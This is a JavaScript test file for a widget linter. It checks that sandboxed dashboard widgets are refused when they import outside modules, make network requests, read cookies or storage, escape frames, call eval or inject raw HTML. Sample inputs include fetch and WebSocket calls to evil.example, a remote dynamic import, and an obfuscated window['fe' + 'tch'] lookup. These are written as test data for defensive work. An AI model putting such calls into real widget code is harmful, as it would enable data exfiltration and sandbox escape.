import assert from 'node:assert/strict';
import test from 'node:test';

import { lintSource } from '../builder/lib/lint.mjs';

const CLEAN = `
import { useMemo } from 'react';
import { Metric, Tile } from '@veetbot/cockpit-kit';
import type { WidgetProps } from '@veetbot/cockpit-kit';

export default function Widget({ feeds, size }: WidgetProps) {
  const top = useMemo(() => feeds['agent.flight']?.data, [feeds]);
  const rect = { top: 1, parent: 'x' };
  return <Tile size={size} title="Flight"><Metric value={String(rect.top)} label={String(top)} /></Tile>;
}
`;

function rules(source) {
  return lintSource(source).map((diagnostic) => diagnostic.rule).sort();
}

function body(statement) {
  return `export default function Widget() {\n  ${statement}\n  return null;\n}\n`;
}

test('a widget built from React and the kit lints clean', () => {
  assert.deepEqual(lintSource(CLEAN), []);
});

test('imports are limited to React and the kit', () => {
  for (const module of ['lodash', './helper', 'node:fs', 'react-dom', '@veetbot/cockpit-kit/internal']) {
    assert.deepEqual(rules(`import x from '${module}';\n${body('void x;')}`), ['lint.import'], module);
  }
  assert.deepEqual(rules(`export { x } from 'lodash';\n${body('')}`), ['lint.import']);
});

test('dynamic import and require are refused', () => {
  assert.deepEqual(rules(body("void import('https://evil.example/x.js');")), ['lint.dynamic_import']);
  assert.deepEqual(rules(body("require('fs');")), ['lint.banned']);
});

test('network, storage, frame-escape and evaluation primitives are refused', () => {
  for (const statement of [
    "fetch('https://evil.example');",
    'new XMLHttpRequest();',
    "new WebSocket('wss://evil.example');",
    "new EventSource('/x');",
    "navigator.sendBeacon('/x', '');",
    'new RTCPeerConnection();',
    "eval('1');",
    "new Function('return 1');",
    'void window.parent;',
    'void top;',
    'void window.opener;',
    "location.href = 'https://evil.example';",
    "window.open('https://evil.example');",
    'void document.cookie;',
    "localStorage.setItem('a', 'b');",
    'void sessionStorage;',
    "indexedDB.open('x');",
    "postMessage('x', '*');",
    "document.write('x');",
    "globalThis.fetch('https://evil.example');",
  ]) {
    assert.deepEqual(rules(body(statement)), ['lint.banned'], statement);
  }
});

test('raw HTML paths are refused', () => {
  assert.deepEqual(rules(body("document.body.innerHTML = '<b>x</b>';")), ['lint.banned']);
  assert.deepEqual(rules(body("document.body.insertAdjacentHTML('beforeend', 'x');")), ['lint.banned']);
  assert.deepEqual(
    rules("export default function W() { return <div dangerouslySetInnerHTML={{ __html: 'x' }} />; }"),
    ['lint.banned'],
  );
});

test('computed access on a global object is refused', () => {
  for (const statement of ["void window['fe' + 'tch'];", 'void globalThis[name];', 'void self[name];']) {
    assert.deepEqual(rules(`const name = 'x';\n${body(statement)}`), ['lint.computed_global'], statement);
  }
});

test('elements that load or navigate are refused', () => {
  for (const element of ['script', 'iframe', 'object', 'embed', 'link', 'meta', 'base', 'form', 'a']) {
    assert.deepEqual(rules(`export default function W() { return <${element} />; }`), ['lint.element'], element);
  }
});

test('colours come from kit tokens, not literals', () => {
  for (const literal of ['#fff', '#0E8B78', 'rgb(1, 2, 3)', 'hsla(1, 2%, 3%, 0.5)', 'oklch(70% 0.1 200)']) {
    assert.deepEqual(rules(body(`const c = '${literal}'; void c;`)), ['lint.colour_literal'], literal);
  }
  assert.deepEqual(
    rules("export default function W() { return <div style={{ color: '#102923' }} />; }"),
    ['lint.colour_literal'],
  );
});

test('the component must be the default export', () => {
  assert.deepEqual(rules('export function Widget() { return null; }\n'), ['lint.default_export']);
});

test('a syntax error is reported rather than thrown', () => {
  assert.deepEqual(rules('export default function W( {'), ['lint.syntax']);
});
